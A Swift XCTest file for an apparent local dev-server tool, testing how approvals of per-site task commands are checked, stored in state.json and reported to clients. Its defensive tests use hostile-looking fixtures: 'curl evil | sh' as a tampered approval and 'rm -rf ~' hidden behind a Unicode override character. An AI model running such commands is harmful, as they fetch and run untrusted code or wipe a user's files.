import XCTest
@testable import PaddockCore

/// What a site's approval means for what runs, how approvals are kept in state.json, and how task status
/// travels to clients.
final class TaskApprovalTests: XCTestCase {
    private let path = "/Users/me/Sites/shop"

    private func file(_ run: String = "php artisan queue:work", proxy: [String: Int] = [:]) -> SiteTasksFile {
        SiteTasksFile(tasks: ["queue": TaskDefinition(run: run, restartOnChange: nil, autostart: nil, stopSeconds: nil)],
                      proxy: proxy)
    }

    private func approved(_ file: SiteTasksFile, at sitePath: String? = nil) -> ApprovedTasks {
        ApprovedTasks(hash: file.hash, file: file, sitePath: sitePath ?? path, stopped: [])
    }

    // MARK: - Evaluation

    func testWithoutAnApprovalNothingRuns() {
        let current = file()
        let none = TaskApproval.evaluate(current: .none, approved: nil, sitePath: path)
        XCTAssertEqual(none.approval, .none)
        XCTAssertNil(none.running)

        let waiting = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: nil, sitePath: path)
        XCTAssertEqual(waiting.approval, .needsApproval)
        XCTAssertNil(waiting.running, "nothing runs until approved")
        XCTAssertEqual(waiting.pending, current)

        let invalid = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: nil, sitePath: path)
        XCTAssertEqual(invalid.approval, .invalid(reason: "it isn't valid JSON"))
        XCTAssertNil(invalid.running)

        let empty = SiteTasksFile(tasks: [:], proxy: [:])
        XCTAssertEqual(TaskApproval.evaluate(current: .file(empty, hash: empty.hash), approved: nil, sitePath: path).approval,
                       .none, "a file with nothing in it needs no approval")
    }

    func testAnApprovedFileRuns() {
        let current = file()
        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: approved(current),
                                           sitePath: path)
        XCTAssertEqual(result.approval, .approved)
        XCTAssertEqual(result.running, current)
        XCTAssertNil(result.pending)
    }

    /// A `git pull` that changes the file never changes what runs: the approved version keeps running.
    func testAChangedRemovedOrBrokenFileKeepsTheApprovedVersion() {
        let old = file("php artisan queue:work")
        let new = file("php artisan queue:work --tries=3")
        let changed = TaskApproval.evaluate(current: .file(new, hash: new.hash), approved: approved(old), sitePath: path)
        XCTAssertEqual(changed.approval, .changed)
        XCTAssertEqual(changed.running, old)
        XCTAssertEqual(changed.pending, new)

        let removed = TaskApproval.evaluate(current: .none, approved: approved(old), sitePath: path)
        XCTAssertEqual(removed.approval, .changed)
        XCTAssertEqual(removed.running, old)
        XCTAssertNil(removed.pending)

        let broken = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: approved(old),
                                           sitePath: path)
        XCTAssertEqual(broken.approval, .changed)
        XCTAssertEqual(broken.running, old)
        XCTAssertEqual(broken.problem, "it isn't valid JSON")
    }

    /// An approval belongs to a folder: a site name that now points at another folder needs approving afresh.
    func testAnApprovalDoesNotFollowTheNameToAnotherFolder() {
        let current = file()
        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash),
                                           approved: approved(current, at: "/Users/me/Other/shop"), sitePath: path)
        XCTAssertEqual(result.approval, .needsApproval)
        XCTAssertNil(result.running)
    }

    /// A stored approval whose definition doesn't hash to its hash (edited by hand, or from a canonical form this
    /// build doesn't know) approves nothing.
    func testATamperedOrUnknownApprovalApprovesNothing() {
        let current = file()
        let tampered = ApprovedTasks(hash: current.hash, file: file("curl evil | sh"), sitePath: path, stopped: [])
        XCTAssertFalse(tampered.isIntact)
        XCTAssertNil(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: tampered,
                                           sitePath: path).running)
        let future = ApprovedTasks(hash: "v2:" + String(current.hash.dropFirst(3)), file: current, sitePath: path, stopped: [])
        XCTAssertFalse(future.isIntact)
        XCTAssertEqual(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: future,
                                             sitePath: path).approval, .needsApproval)
        let invalidStored = SiteTasksFile(tasks: ["Bad Name": TaskDefinition(run: "x", restartOnChange: nil, autostart: nil,
                                                                             stopSeconds: nil)], proxy: [:])
        XCTAssertFalse(ApprovedTasks(hash: invalidStored.hash, file: invalidStored, sitePath: path, stopped: []).isIntact,
                       "a stored definition must follow the same rules as the file")
    }

    // MARK: - Commands that can be shown

    func testOnlyCommandsThatShowAsTheyRunCanBeApproved() {
        XCTAssertTrue(Messages.isShowable("php artisan queue:work redis --queue=default,scout --tries=3"))
        XCTAssertTrue(Messages.isShowable("echo 'Café'  && bun run dev"), "letters beyond ASCII and double spaces show as they are")
        for hidden in ["echo hi\u{1B}[2K", "a\tb", "rm -rf ~\u{202E}", "x\u{200B}y", "a\u{00A0}b", "a\u{7F}b", "a\u{E000}b"] {
            XCTAssertFalse(Messages.isShowable(hidden), hidden.debugDescription)
        }
    }

    // MARK: - state.json

    func testStateRoundTripsWithAndWithoutApprovals() throws {
        let empty = State(parked: ["/p"])
        XCTAssertEqual(try JSONDecoder().decode(State.self, from: JSONEncoder().encode(empty)), empty)
        XCTAssertEqual(empty.taskApprovals, [:])

        var state = State(parked: ["/p"])
        var approval = approved(file(proxy: ["/app": 8080]))
        approval.stopped = ["queue"]
        approval.goneSince = Date(timeIntervalSince1970: 1_800_000_000)
        state.taskApprovals = ["shop": approval]
        let decoded = try JSONDecoder().decode(State.self, from: JSONEncoder().encode(state))
        XCTAssertEqual(decoded, state)
        XCTAssertTrue(decoded.taskApprovals["shop"]?.isIntact ?? false)
    }

    func testOlderStateFilesAndBrokenApprovalsDecode() throws {
        let older = #"{"parked": ["/p"], "links": {}, "secured": [], "phpPins": {}}"#
        XCTAssertEqual(try JSONDecoder().decode(State.self, from: Data(older.utf8)).taskApprovals, [:])
        let current = file()
        let good = String(decoding: try JSONEncoder().encode(approved(current)), as: UTF8.self)
        let mixed = #"{"parked": [], "links": {}, "secured": [], "phpPins": {}, "taskApprovals": {"#
            + #""shop": "# + good + #", "broken": {"hash": 5}}}"#
        let decoded = try JSONDecoder().decode(State.self, from: Data(mixed.utf8))
        XCTAssertEqual(Array(decoded.taskApprovals.keys), ["shop"], "one unreadable approval never costs the state file")
        let minimal = #"{"hash": "\#(current.hash)", "file": {"tasks": {"queue": {"run": "php artisan queue:work"}}}, "sitePath": "/x"}"#
        let approval = try JSONDecoder().decode(ApprovedTasks.self, from: Data(minimal.utf8))
        XCTAssertEqual(approval.stopped, [])
        XCTAssertNil(approval.goneSince)
        XCTAssertTrue(approval.isIntact)
    }

    // MARK: - Status on the wire

    func testTaskStatusRoundTripsAndUnknownStatesFallBack() throws {
        let status = SiteTasksStatus(
            approval: .changed,
            tasks: [TaskStatus(name: "queue", run: "php artisan queue:work", state: .running(pid: 42), restartOnChange: true,
                               logPath: "/h/log/tasks/shop/queue.log", warning: nil),
                    TaskStatus(name: "once", run: "php artisan migrate", state: .stopped(reason: .exited),
                               restartOnChange: false, logPath: "/l", warning: "w"),
                    TaskStatus(name: "dup", run: "x", state: .alreadyRunning(pid: 7), restartOnChange: false, logPath: "/l",
                               warning: nil),
                    TaskStatus(name: "bad", run: "x", state: .crashed(reason: "r"), restartOnChange: false, logPath: "/l",
                               warning: nil)],
            pending: [PendingTask(name: "queue", run: "php artisan queue:work --tries=3", port: nil),
                      PendingTask(name: "/app", run: nil, port: 8080)],
            pendingHash: "v1:abc", notice: "n")
        XCTAssertEqual(try JSONDecoder().decode(SiteTasksStatus.self, from: JSONEncoder().encode(status)), status)
        for state in [TaskState.starting, .stopped(reason: nil), .stopped(reason: .byYou), .waitingForApproval] {
            XCTAssertEqual(try JSONDecoder().decode(TaskState.self, from: JSONEncoder().encode(state)), state)
        }
        XCTAssertEqual(try JSONDecoder().decode(TaskState.self, from: Data(#"{"hibernating": {}}"#.utf8)),
                       .crashed(reason: "unknown state"))
        XCTAssertEqual(try JSONDecoder().decode(TaskStopReason.self, from: Data(#""vacation""#.utf8)), .unknown)
        XCTAssertEqual(try JSONDecoder().decode(TaskApprovalState.self, from: Data(#"{"maybe": {}}"#.utf8)), .needsApproval,
                       "an approval state this build doesn't know never reads as approved")
        let sparse = try JSONDecoder().decode(SiteTasksStatus.self, from: Data(#"{"approval": {"approved": {}}}"#.utf8))
        XCTAssertEqual(sparse.tasks, [])
        XCTAssertEqual(sparse.pending, [])
    }

    func testASiteFromAnOlderDaemonHasNoTasksAndAnUnreadableTasksStatusIsDropped() throws {
        let older = #"{"name": "shop", "path": "/p", "kind": "parked", "secured": false, "php": "8.4", "pinned": false, "tld": "test"}"#
        let site = try JSONDecoder().decode(Site.self, from: Data(older.utf8))
        XCTAssertNil(site.tasks)
        let broken = #"{"name": "shop", "path": "/p", "kind": "parked", "secured": false, "php": "8.4", "pinned": false, "tld": "test", "tasks": 5}"#
        XCTAssertNil(try JSONDecoder().decode(Site.self, from: Data(broken.utf8)).tasks)
        var withTasks = site
        withTasks.tasks = SiteTasksStatus(approval: .needsApproval, tasks: [], pending: [], pendingHash: nil, notice: nil)
        XCTAssertEqual(try JSONDecoder().decode(Site.self, from: JSONEncoder().encode(withTasks)), withTasks)
    }

    func testTheBuildNumberMovesOn() {
        XCTAssertGreaterThanOrEqual(PaddockBuild.number, 9, "site tasks are in the status: the build number moves on")
    }
}
